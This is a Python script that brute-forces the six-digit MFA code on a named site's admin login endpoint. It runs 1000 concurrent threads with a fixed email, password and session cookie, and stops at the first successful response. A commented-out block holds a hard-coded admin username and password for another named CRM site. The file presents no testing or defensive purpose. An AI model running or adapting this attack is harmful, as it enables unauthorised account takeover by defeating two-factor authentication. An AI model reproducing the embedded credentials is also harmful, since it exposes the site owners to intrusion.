import requests
import threading
from threading import Thread
from queue import Queue
running = False


class MyThead(Thread):
    def __init__(self):
        Thread.__init__(self)
        # self.queue = queue

    def send(self, method, url, headers, params='', data='', cookies=''):
        if method.lower() == "get":
            res = requests.get(url, headers=headers, params=params, verify=False, cookies=cookies)
            return res
        elif method.lower() == "post":
            if len(params) > 0:
                res = requests.post(url, headers=headers, params=params, data=data.encode("utf-8"), verify=False, cookies=cookies, timeout=None)
            else:
                res = requests.post(url, headers=headers, data=data.encode("utf-8"), verify=False, cookies=cookies, timeout=1000)
            return res
        elif method.lower() == "put":
            if params is not None:
                res = requests.put(url, headers=headers, data=data.encode("utf-8"), verify=False)
            else:
                res = requests.put(url, verify=False)
            return res

        elif method.lower() == "delete":
            if params is not None:
                res = requests.delete(url, hearders=headers, data=data.encode("utf-8"), verify=False)
            else:
                res = requests.put(url, hearders=headers, verify=False)
            return res
        else:
            print("无效的请求方式，get/post/put/delete,请查找原因！！！")

    # def login():
    # 	payload = "dosubmit=yes&username=admin&password=Ghy511&submit.x=26&submit.y=17"
    # 	url = "http://crm.joysw.cn/login.php"
    # 	headers = {
    # 				"Host": "crm.joysw.cn",
    # 				"Connection": "keep-alive",
    # 				"Content-Length": "67",
    # 				"Cache-Control": "max-age=0",
    # 				"Upgrade-Insecure-Requests": "1",
    # 				"Origin": "http://crm.joysw.cn",
    # 				"Content-Type": "application/x-www-form-urlencoded",
    # 				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, " \
    # 							 "like Gecko) Chrome/86.0.4240.75 Safari/537.36",
    # 				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,"
    # 						  "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    # 				"Referer": "http://crm.joysw.cn/login.php",
    # 				"Accept-Encoding": "gzip, deflate",
    # 				"Accept-Language": "zh-CN,zh;q=0.9"
    # 				}
    # 	res = send(url=url,method="post",headers=headers,data=payload)
    # 	cookies = res.cookies
    # 	cookie = requests.utils.dict_from_cookiejar(cookies)
    # 	return cookie
    def run(self):
        url = "https://dibaqu.com/admin/login/executeByPassword"
        sessionId = {'PHPSESSID':'tqt7f412fkik9s2vq5rl2bifee'}
        headers = {
                    "Host": "dibaqu.com",
                    "Origin": "dibaqu.com",
                    "Connection": "keep-alive",
                    "Accept": "*/*",
                    "Content - Length": "55",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                                  "Chrome/89.0.4350.7 Safari/537.36",
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Sec - Fetch - Site': 'same - origin',
                    'Sec - Fetch - Mode': 'cors',
                    'Sec - Fetch - Dest': 'empty',
                    'Referer': 'https://dibaqu.com/storage/login'
        }

        while True:
            global running
            if q.empty() or running:
                break
            else:
                # print(running)
                strid = str(q.get())
            try:
                payload = "user=t2%40dibaqu.com&password=t2%404321&mfa_code={id}".format(id=strid)
                # data = "pageNow={id}&pageSize=10&zone=md&state=&site=&parentName=&" \
                # 	   "begintime=2015-10-16+00%3A00%3A00&endtime=2020-10-16+23%3A59%3A59&" \
                # 	   "username=&timetype=submitTime&vipLevelId=&serialid=&paychannel=&beginAmount=&endAmount=".format(
                # 	id=id)
                workres = self.send(method="post", url=url, headers=headers, data=payload,cookies=sessionId)
                # if workres.status_code == 500:
                #     workres = self.send(method="post", url=url, headers=headers, data=payload, cookies=getcookie)
                # else:
                #     pass
                print(strid)
                result = workres.json()
                if result['code'] == 200:
                    print(strid)
                    print(result)
                    running = True
                else:
                    pass
                # if "短信" in workres.json()['msg']:
                #     pass
                # else:
                #     print(workres.headers)
                #     print(workres.cookies)
                #     running = True
                #     with open("./a.txt", 'a+', encoding='utf-8') as f:
                #         f.write(strid+":"+workres.text)
            except:
                pass


if __name__ == "__main__":
    q = Queue(maxsize=0)
    for i in range(99999, 999999):
        q.put(i)
    lock = threading.Lock()
    # 设置线程
    threadparse = []
    for threadName in range(0, 1000):
        thread = MyThead()
        thread.start()
        threadparse.append(thread)

    for thread in threadparse:
        thread.join()
        print('线程结束')
